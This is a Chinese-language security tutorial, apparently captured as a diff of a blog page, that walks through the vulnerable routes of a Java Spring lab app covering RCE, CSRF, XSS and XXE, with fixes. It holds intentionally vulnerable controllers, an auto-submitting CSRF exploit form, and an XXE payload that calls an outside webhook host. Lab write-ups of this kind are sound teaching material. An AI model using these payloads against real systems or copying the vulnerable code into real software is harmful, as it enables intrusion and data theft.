class="toc-text">2.路由&#x2F;codeinject&#x2F;host</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81Cookie%E4%BC%AA%E9%80%A0"><span class="toc-text">九、Cookie伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln01"><span class="toc-text">1.路由&#x2F;cookie&#x2F;vuln01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln02"><span class="toc-text">2.路由&#x2F;cookie&#x2F;vuln02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln03"><span class="toc-text">3.路由&#x2F;cookie&#x2F;vuln03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln04"><span class="toc-text">4.路由&#x2F;cookie&#x2F;vuln04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln05"><span class="toc-text">5.路由&#x2F;cookie&#x2F;vuln05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln06"><span class="toc-text">6.路由&#x2F;cookie&#x2F;vuln06</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81CORS"><span class="toc-text">十、CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-origin"><span class="toc-text">1.路由&#x2F;cors&#x2F;vuln&#x2F;origin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-setHeader"><span class="toc-text">2.路由&#x2F;cors&#x2F;vuln&#x2F;setHeader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-crossOrigin"><span class="toc-text">3.路由&#x2F;cors&#x2F;vuln&#x2F;crossOrigin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-text">漏洞防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6origin"><span class="toc-text">（1）限制origin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89WebMvcConfigurer%E8%AE%BE%E7%BD%AECors"><span class="toc-text">（2）WebMvcConfigurer设置Cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89spring-security%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">（3）spring security设置cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E8%87%AA%E5%AE%9A%E4%B9%89filter%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">（4）自定义filter设置cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%885%EF%BC%89CorsFilter%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">（5）CorsFilter设置cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%886%EF%BC%89origin%E6%A3%80%E6%9F%A5"><span class="toc-text">（6）origin检查</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">十一、目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-path-traversal-x2F-vul"><span class="toc-text">1.路由&#x2F;path_traversal&#x2F;vul</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">十二、文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-file-x2F-upload"><span class="toc-text">1.路由&#x2F;file&#x2F;upload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%89%E3%80%81SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">十三、SpEL表达式注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-spel-x2F-vuln1"><span class="toc-text">1.路由&#x2F;spel&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-spel-x2F-vuln2"><span class="toc-text">2.路由&#x2F;spel&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81Deserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">十四、Deserialize反序列化</span></a></li></ol></div></p>
 <h2 id="一、RCE"><a href="#一、RCE" class="headerlink" title="一、RCE"></a>一、RCE</h2><h3 id="1-路由-x2F-rce-x2F-runtime-x2F-exec"><a href="#1-路由-x2F-rce-x2F-runtime-x2F-exec" class="headerlink" title="1.路由&#x2F;rce&#x2F;runtime&#x2F;exec"></a>1.路由&#x2F;rce&#x2F;runtime&#x2F;exec</h3><p>漏洞代码：</p>
 <pre><code class="java">@GetMapping(&quot;/runtime/exec&quot;)
     public String CommandExec(String cmd) &#123;
@@ -1445,59 +1453,6 @@ public String commonsHttpClient(@RequestParam String url) &#123;
         &#125;
     &#125;
 </code></pre>
-<p>三种方法对比：</p>
-<table>
-<thead>
-<tr>
-<th align="center">特性&#x2F;方法</th>
-<th>Commons HttpClient</th>
-<th>Apache HttpComponents HttpClient</th>
-<th>OkHttp</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center"><strong>创建时间&#x2F;版本</strong></td>
-<td>较旧，现已被替代</td>
-<td>现代版本，更强的功能和配置支持</td>
-<td>现代库，轻量、快速，适用于移动端和高并发场景</td>
-</tr>
-<tr>
-<td align="center"><strong>请求构建</strong></td>
-<td>使用 <code>HttpClient</code> 和 <code>GetMethod</code></td>
-<td>使用 <code>CloseableHttpClient</code> 和 <code>HttpGet</code></td>
-<td>使用 <code>OkHttpClient</code> 和 <code>Request</code></td>
-</tr>
-<tr>
-<td align="center"><strong>响应处理</strong></td>
-<td>通过 <code>method.getResponseBody()</code> 获取字节流</td>
-<td>通过 <code>response.getEntity().getContent()</code></td>
-<td>通过 <code>response.body().string()</code> 获取字符串</td>
-</tr>
-<tr>
-<td align="center"><strong>异步请求支持</strong></td>
-<td>需要手动实现</td>
-<td>可以配置异步请求</td>
-<td>原生支持异步请求处理</td>
-</tr>
-<tr>
-<td align="center"><strong>重定向控制</strong></td>
-<td>手动配置，较复杂</td>
-<td>可通过 <code>RequestConfig</code> 配置</td>
-<td>默认支持，且可通过设置轻松禁用</td>
-</tr>
-<tr>
-<td align="center"><strong>连接池</strong></td>
-<td>需要额外配置</td>
-<td>原生支持</td>
-<td>原生支持，轻量高效</td>
-</tr>
-<tr>
-<td align="center"><strong>应用场景</strong></td>
-<td>较旧的应用、低并发场景</td>
-<td>企业级应用、复杂 HTTP 请求</td>
-<td>高并发、异步处理、移动端应用</td>
-</tr>
-</tbody></table>
 <h5 id="方法4："><a href="#方法4：" class="headerlink" title="方法4："></a>方法4：</h5><pre><code class="java">    @GetMapping(&quot;/Jsoup/sec&quot;)
     public String Jsoup(@RequestParam String url) &#123;
 
@@ -1734,7 +1689,1043 @@ public String commonsHttpClient(@RequestParam String url) &#123;
 <li><strong>网络审计</strong>：可用于监控网络流量，以记录或分析 <code>Socket</code> 通信内容。</li>
 <li><strong>调试&#x2F;测试</strong>：在调试或测试环境中，使用钩子来捕获和分析网络通信行为。</li>
 </ul>
+<h2 id="五、CSRF"><a href="#五、CSRF" class="headerlink" title="五、CSRF"></a>五、CSRF</h2><p> <strong>CSRF 攻击原理</strong></p>
+<p>CSRF 的核心是利用用户的身份认证会话。例如，用户在登录某个网站后，拥有一个有效的会话 Cookie，这个 Cookie 允许用户在不重新登录的情况下执行后续操作。攻击者通过诱导用户访问恶意网站，自动向受信任网站发送合法的请求（携带了用户的会话 Cookie），从而让服务器认为是合法用户发起的操作。</p>
+<p><strong>攻击流程：</strong></p>
+<ol>
+<li>用户在浏览器中登录了受信任的网站（如银行网站），并且拥有有效的会话。</li>
+<li>攻击者创建了一个恶意网站，嵌入了向受信任网站发送请求的代码。</li>
+<li>用户在登录受信任网站后，访问了攻击者的恶意网站，恶意网站在用户不知情的情况下，自动向受信任网站发送请求（如转账请求）。</li>
+<li>受信任的网站无法区分该请求是用户发起的还是攻击者伪造的，因此会执行这个请求。</li>
+</ol>
+<h3 id="1-路由-x2F-csrf-x2F-post"><a href="#1-路由-x2F-csrf-x2F-post" class="headerlink" title="1.路由&#x2F;csrf&#x2F;post"></a>1.路由&#x2F;csrf&#x2F;post</h3><p>漏洞代码：</p>
+<pre><code class="Java">@Controller
+@RequestMapping(&quot;/csrf&quot;)
+public class CSRF &#123;
 
+    @GetMapping(&quot;/&quot;)
+    public String index() &#123;
+        return &quot;form&quot;;
+    &#125;
+
+    @PostMapping(&quot;/post&quot;)
+    @ResponseBody
+    public String post() &#123;
+        return &quot;CSRF passed.&quot;;
+    &#125;
+&#125;
+</code></pre>
+<p>对应前端代码：</p>
+<pre><code class="html">
+&lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot; lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;script th:src=&quot;@&#123;https://code.jquery.com/jquery-3.4.1.min.js&#125;&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+
+
+&lt;body&gt;
+
+
+&lt;div&gt;
+    &lt;!-- th:action with Spring 3.2+ and Thymeleaf 2.1+ can automatically force Thymeleaf to include the CSRF token as a hidden field --&gt;
+    &lt;!-- &lt;form name=&quot;f&quot; th:action=&quot;@&#123;/csrf/post&#125;&quot; method=&quot;post&quot;&gt; --&gt;
+    &lt;form name=&quot;f&quot; action=&quot;/csrf/post&quot; method=&quot;post&quot;&gt;
+        &lt;input type=&quot;text&quot; name=&quot;input&quot; /&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; th:name=&quot;$&#123;_csrf.parameterName&#125;&quot; th:value=&quot;$&#123;_csrf.token&#125;&quot; /&gt;
+    &lt;/form&gt;
+&lt;/div&gt;
+
+
+&lt;/body&gt;
+
+
+
+
+&lt;/html&gt;
+</code></pre>
+<p>该代码存在csrf漏洞，漏洞验证poc：</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;CSRF Exploit&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Simulating CSRF Attack&lt;/h1&gt;
+
+    &lt;form id=&quot;csrfForm&quot; action=&quot;http://127.0.0.1:8080/csrf/post&quot; method=&quot;POST&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;message&quot; value=&quot;This is a CSRF attack message&quot;&gt;
+    &lt;/form&gt;
+
+    &lt;script&gt;
+        // 自动提交表单，执行攻击
+        document.getElementById(&#39;csrfForm&#39;).submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>访问该页面，会自动调用该路由实现CSRF攻击。</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104016372.png" alt="image-20241008104016372"></p>
+<h3 id="CSRF防护"><a href="#CSRF防护" class="headerlink" title="CSRF防护"></a>CSRF防护</h3><p><strong>使用CSRF Token</strong>：</p>
+<ul>
+<li>服务器生成一个唯一的CSRF Token并将其发送给用户（通常通过隐藏字段、URL参数或HTTP头）。</li>
+<li>在提交表单或发起请求时，客户端将该Token一同发送回服务器，服务器验证Token的有效性以防止伪造请求。</li>
+</ul>
+<p><strong>SameSite Cookie 属性</strong>：</p>
+<ul>
+<li>设置Cookie的<code>SameSite</code>属性为<code>Strict</code>或<code>Lax</code>，限制第三方网站通过跨站点方式发送Cookie。</li>
+<li><code>Strict</code>：禁止任何跨站请求携带Cookie。</li>
+<li><code>Lax</code>：允许一些安全的跨站请求（例如GET请求），但阻止POST等敏感操作。</li>
+</ul>
+<p><strong>双重Cookie验证</strong>：</p>
+<ul>
+<li>服务器发送一个Cookie给用户，客户端在请求时会自动携带该Cookie。</li>
+<li>客户端还需要在表单中携带相同的值（通过JS从Cookie中提取），服务器检查这两个值是否匹配。</li>
+</ul>
+<p><strong>检查Referer头</strong>：</p>
+<ul>
+<li>服务器通过验证请求头中的<code>Referer</code>字段是否来自合法的域名，来确定请求是否来自可信来源。</li>
+<li>这种方法并不完全可靠，因为有些环境下<code>Referer</code>头可能会被修改或省略。</li>
+</ul>
+<p><strong>CAPTCHA</strong>：</p>
+<ul>
+<li>使用CAPTCHA来确保请求是由真实用户而非自动化脚本发起，虽然这种方式不能完全防护CSRF，但能增加攻击难度。</li>
+</ul>
+<p><strong>限制请求来源</strong>：</p>
+<ul>
+<li>对敏感操作（如资金转移、修改账户信息等）设置请求来源的严格验证，确保这些操作只能通过特定的合法来源进行。</li>
+</ul>
+<h2 id="六、XSS"><a href="#六、XSS" class="headerlink" title="六、XSS"></a>六、XSS</h2><h3 id="1-路由-x2F-xss-x2F-reflect"><a href="#1-路由-x2F-xss-x2F-reflect" class="headerlink" title="1.路由&#x2F;xss&#x2F;reflect"></a>1.路由&#x2F;xss&#x2F;reflect</h3><p>漏洞代码：</p>
+<pre><code class="Java"> @RequestMapping(&quot;/reflect&quot;)
+    @ResponseBody
+    public static String reflect(String xss) &#123;
+        return xss;
+    &#125;
+</code></pre>
+<p>存在反射型xss，验证漏洞：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104436572.png" alt="image-20241008104436572"></p>
+<h3 id="2-路由-x2F-xss-x2F-stored"><a href="#2-路由-x2F-xss-x2F-stored" class="headerlink" title="2.路由&#x2F;xss&#x2F;stored"></a>2.路由&#x2F;xss&#x2F;stored</h3><p>漏洞代码：</p>
+<pre><code class="Java"> @RequestMapping(&quot;/stored/store&quot;)
+    @ResponseBody
+    public String store(String xss, HttpServletResponse response) &#123;
+        Cookie cookie = new Cookie(&quot;xss&quot;, xss);
+        response.addCookie(cookie);
+        return &quot;Set param into cookie&quot;;
+    &#125;
+
+    /**
+     * Vul Code.
+     * StoredXSS Step2
+     * http://localhost:8080/xss/stored/show
+     *
+     * @param xss unescape string
+     */
+    @RequestMapping(&quot;/stored/show&quot;)
+    @ResponseBody
+    public String show(@CookieValue(&quot;xss&quot;) String xss) &#123;
+        return xss;
+    &#125;
+</code></pre>
+<p>存在存储型xss，漏洞验证：</p>
+<p>先利用路由<code>/xss/stored/store</code>将恶意代码存到cookie中</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104751040.png" alt="image-20241008104751040"></p>
+<p>再访问<code>/xss/stored/show</code>路由实现攻击：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104854995.png" alt="image-20241008104854995"></p>
+<h3 id="XSS攻击防护"><a href="#XSS攻击防护" class="headerlink" title="XSS攻击防护"></a>XSS攻击防护</h3><p>防护代码：</p>
+<pre><code>    @RequestMapping(&quot;/safe&quot;)
+    @ResponseBody
+    public static String safe(String xss) &#123;
+        return encode(xss);
+    &#125;
+
+    private static String encode(String origin) &#123;
+        origin = StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;amp;&quot;);
+        origin = StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&amp;lt;&quot;);
+        origin = StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&amp;gt;&quot;);
+        origin = StringUtils.replace(origin, &quot;\&quot;&quot;, &quot;&amp;quot;&quot;);
+        origin = StringUtils.replace(origin, &quot;&#39;&quot;, &quot;&amp;#x27;&quot;);
+        origin = StringUtils.replace(origin, &quot;/&quot;, &quot;&amp;#x2F;&quot;);
+        return origin;
+    &#125;
+&#125;
+</code></pre>
+<p>对一些可能会被利用的关键字进行替换成安全的编码</p>
+<h2 id="七、XXE"><a href="#七、XXE" class="headerlink" title="七、XXE"></a>七、XXE</h2><h3 id="1-路由-x2F-xxe-x2F-xmlReader-x2F-vuln"><a href="#1-路由-x2F-xxe-x2F-xmlReader-x2F-vuln" class="headerlink" title="1.路由&#x2F;xxe&#x2F;xmlReader&#x2F;vuln"></a>1.路由&#x2F;xxe&#x2F;xmlReader&#x2F;vuln</h3><p>漏洞代码：</p>
+<pre><code class="Java">@PostMapping(&quot;/xmlReader/vuln&quot;)
+    public String xmlReaderVuln(HttpServletRequest request) &#123;
+        try &#123;
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
+            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
+            return &quot;xmlReader xxe vuln code&quot;;
+        &#125; catch (Exception e) &#123;
+            logger.error(e.toString());
+            return EXCEPT;
+        &#125;
+    &#125;
+</code></pre>
+<h3 id="2-路由-x2F-xxe-x2F-SAXBuilder-x2F-vuln"><a href="#2-路由-x2F-xxe-x2F-SAXBuilder-x2F-vuln" class="headerlink" title="2.路由&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln"></a>2.路由&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</h3><pre><code class="java">@RequestMapping(value = &quot;/SAXBuilder/vuln&quot;, method = RequestMethod.POST)
+    public String SAXBuilderVuln(HttpServletRequest request) &#123;
+        try &#123;
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            SAXBuilder builder = new SAXBuilder();
+            // org.jdom2.Document document
+            builder.build(new InputSource(new StringReader(body)));  // cause xxe
+            return &quot;SAXBuilder xxe vuln code&quot;;
+        &#125; catch (Exception e) &#123;
+            logger.error(e.toString());
+            return EXCEPT;
+        &#125;
+    &#125;
+</code></pre>
+<p>换用SAXReader第三方库，攻击手法同上：</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;https://webhook.site/bef89c10-3850-4342-8f7e-934073c0cc12&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;
+</code></pre>
+<p>POST发送:</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008110604490.png" alt="image-20241008110604490"></p>
+<p>接收到dnslog：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008110623158.png" alt="image-20241008110623158"></p>
+<p><strong>修复代码</strong></p>
+<p>原理同上，禁用了外部实体：</p>
+<pre><code class="Java">    @RequestMapping(value = &quot;/SAXBuilder/sec&quot;, method = RequestMethod.POST)
+    public String SAXBuilderSec(HttpServletRequest request) &#123;
+        try &#123;
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            SAXBuilder builder = new SAXBuilder();
+            builder.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
+            builder.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
+            builder.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
+            // org.jdom2.Document document
+            builder.build(new InputSource(new StringReader(body)));
+
+        &#125; catch (Exception e) &#123;
+            logger.error(e.toString());
+            return EXCEPT;
+        &#125;
+
+        return &quot;SAXBuilder xxe security code&quot;;
+    &#125;
+</code></pre>
+<h3 id="3-路由-x2F-xxe-x2F-SAXReader-x2F-vuln"><a href="#3-路由-x2F-xxe-x2F-SAXReader-x2F-vuln" class="headerlink" title="3.路由&#x2F;xxe&#x2F;SAXReader&#x2F;vuln"></a>3.路由&#x2F;xxe&#x2F;SAXReader&#x2F;vuln</h3><p>漏洞代码：</p>
+<pre><code class="Java">@RequestMapping(value = &quot;/SAXReader/vuln&quot;, method = RequestMethod.POST)
+    public String SAXReaderVuln(HttpServletRequest request) &#123;
+        try &#123;
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            SAXReader reader = new SAXReader();
+            // org.dom4j.Document document
+            reader.read(new InputSource(new StringReader(body))); // cause xxe
+
+        &#125; catch (Exception e) &#123;
+            logger.error(e.toString());
+            return EXCEPT;
+        &#125;
+
+        return &quot;SAXReader xxe vuln code&quot;;
+    &#125;
+</code></pre>
+<p>跟上面的区别是该类有回显，payload不变</p>
+<h3 id="4-路由-x2F-xxe-x2F-SAXParser-x2F-vuln"><a href="#4-路由-x2F-xxe-x2F-SAXParser-x2F-vuln" class="headerlink" title="4.路由&#x2F;xxe&#x2F;SAXParser&#x2F;vuln"></a>4.路由&#x2F;xxe&#x2F;SAXParser&#x2F;vuln</h3><p>漏洞代码：</p>
+<pre><code class="java">  @RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)
+    public String SAXParserVuln(HttpServletRequest request) &#123;
+        try &#123;
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            SAXParserFactory spf = SAXParserFactory.newInstance();
+            SAXParser parser = spf.newSAXParser();
+            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml
+
+            return &quot;SAXParser xxe vuln code&quot;;
+        &#125; catch (Exception e) &#123;
+            logger.error(e.toString());
+            return EXCEPT;
+        &#125;
+    &#125;
+</code></pre>
+<h3 id="5-路由-x2F-xxe-x2F-Digester-x2F-vuln"><a href="#5-路由-x2F-xxe-x2F-Digester-x2F-vuln" class="headerlink" title="5.路由&#x2F;xxe&#x2F;Digester&#x2F;vuln"></a>5.路由&#x2F;xxe&#x2F;Digester&#x2F;vuln</h3><p>漏洞代码：</p>
+<pre><code class="java">@RequestMapping(value = &quot;/Digester/vuln&quot;, method = RequestMethod.POST)
+    public String DigesterVuln(HttpServletRequest request) &#123;
+        try &#123;
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            Digester digester = new Digester();
+            digester.parse(new StringReader(body));  // parse xml
+        &#125; catch (Exception e) &#123;
+            logger.error(e.toString());
+            return EXCEPT;
+        &#125;
+        return &quot;Digester xxe vuln code&quot;;
+    &#125;
+</code></pre>
+<h3 id="6-路由-x2F-xxe-x2F-DocumentBuilder-x2F-vuln"><a href="#6-路由-x2F-xxe-x2F-DocumentBuilder-x2F-vuln" class="headerlink" title="6.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln"></a>6.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</h3><p>漏洞代码：</p>
+<pre><code class="java">@RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST)
+    public String DocumentBuilderVuln(HttpServletRequest request) &#123;
+        try &#123;
+            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+            DocumentBuilder db = dbf.newDocumentBuilder();
+            InputSource is = new InputSource(request.getInputStream());
+            Document document = db.parse(is);  // parse xml
+
+            // 遍历xml节点name和value
+            StringBuilder buf = new StringBuilder();
+            NodeList rootNodeList = document.getChildNodes();
+            for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;
+                Node rootNode = rootNodeList.item(i);
+                NodeList child = rootNode.getChildNodes();
+                for (int j = 0; j &lt; child.getLength(); j++) &#123;
+                    Node node = child.item(j);
+                    buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));
+                &#125;
+            &#125;
+            return buf.toString();
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+            logger.error(e.toString());
+            return e.toString();
+        &#125;
+    &#125;
+</code></pre>
+<p>这是JDK自带的类，以此产生的XXE是存在回显的</p>
+<h3 id="7-路由-x2F-xxe-x2F-DocumentBuilder-x2F-xinclude-x2F-vuln"><a href="#7-路由-x2F-xxe-x2F-DocumentBuilder-x2F-xinclude-x2F-vuln" class="headerlink" title="7.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln"></a>7.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</h3><p>漏洞代码：</p>
+<pre><code class="Java">@RequestMapping(value = &quot;/DocumentBuilder/xinclude/vuln&quot;, method = RequestMethod.POST)
+    public String DocumentBuilderXincludeVuln(HttpServletRequest request) &#123;
+        try &#123;
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+            dbf.setXIncludeAware(true);   // 支持XInclude
+            dbf.setNamespaceAware(true);  // 支持XInclude
+            DocumentBuilder db = dbf.newDocumentBuilder();
+            StringReader sr = new StringReader(body);
+            InputSource is = new InputSource(sr);
+            Document document = db.parse(is);  // parse xml
+
+            NodeList rootNodeList = document.getChildNodes();
+            response(rootNodeList);
+
+            sr.close();
+            return &quot;DocumentBuilder xinclude xxe vuln code&quot;;
+        &#125; catch (Exception e) &#123;
+            logger.error(e.toString());
+            return EXCEPT;
+        &#125;
+    &#125;
+</code></pre>
+<h3 id="8-路由-x2F-xxe-x2F-XMLReader-x2F-vuln"><a href="#8-路由-x2F-xxe-x2F-XMLReader-x2F-vuln" class="headerlink" title="8.路由&#x2F;xxe&#x2F;XMLReader&#x2F;vuln"></a>8.路由&#x2F;xxe&#x2F;XMLReader&#x2F;vuln</h3><p>漏洞代码：</p>
+<pre><code class="java">@PostMapping(&quot;/XMLReader/vuln&quot;)
+    public String XMLReaderVuln(HttpServletRequest request) &#123;
+        try &#123;
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            SAXParserFactory spf = SAXParserFactory.newInstance();
+            SAXParser saxParser = spf.newSAXParser();
+            XMLReader xmlReader = saxParser.getXMLReader();
+            xmlReader.parse(new InputSource(new StringReader(body)));
+
+        &#125; catch (Exception e) &#123;
+            logger.error(e.toString());
+            return EXCEPT;
+        &#125;
+
+        return &quot;XMLReader xxe vuln code&quot;;
+    &#125;
+</code></pre>
+<h3 id="9-路由-x2F-xxe-x2F-DocumentHelper-x2F-vuln"><a href="#9-路由-x2F-xxe-x2F-DocumentHelper-x2F-vuln" class="headerlink" title="9.路由&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln"></a>9.路由&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</h3><p>漏洞代码：</p>
+<pre><code>@PostMapping(&quot;/DocumentHelper/vuln&quot;)
+    public String DocumentHelper(HttpServletRequest req) &#123;
+        try &#123;
+            String body = WebUtils.getRequestBody(req);
+            DocumentHelper.parseText(body); // parse xml
+        &#125; catch (Exception e) &#123;
+            logger.error(e.toString());
+            return EXCEPT;
+        &#125;
+
+        return &quot;DocumentHelper xxe vuln code&quot;;
+    &#125;
+
+
+    private static void response(NodeList rootNodeList)&#123;
+        for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;
+            Node rootNode = rootNodeList.item(i);
+            NodeList xxe = rootNode.getChildNodes();
+            for (int j = 0; j &lt; xxe.getLength(); j++) &#123;
+                Node xxeNode = xxe.item(j);
+                // 测试不能blind xxe，所以强行加了一个回显
+                logger.info(&quot;xxeNode: &quot; + xxeNode.getNodeValue());
+            &#125;
+
+        &#125;
+    &#125;
+</code></pre>
+<p>修复该漏洞只需升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY，不带ENTITY的PoC不能利用，所以禁用ENTITY即可完成修复。</p>
+<h3 id="上述存在XXE漏洞库对比"><a href="#上述存在XXE漏洞库对比" class="headerlink" title="上述存在XXE漏洞库对比"></a>上述存在XXE漏洞库对比</h3><table>
+<thead>
+<tr>
+<th><strong>工具&#x2F;类</strong></th>
+<th><strong>简介</strong></th>
+<th><strong>使用场景</strong></th>
+<th><strong>优点</strong></th>
+<th><strong>缺点</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>xmlReader</code></td>
+<td>SAX 的接口，基于事件驱动的解析</td>
+<td>处理大型 XML 文件</td>
+<td>内存占用小，速度快</td>
+<td>需要手动管理上下文，处理复杂结构困</td>
+</tr>
+<tr>
+<td><code>SAXBuilder</code></td>
+<td>JDOM 中基于 SAX 的解析器</td>
+<td>需要用 JDOM 处理 XML 数据时</td>
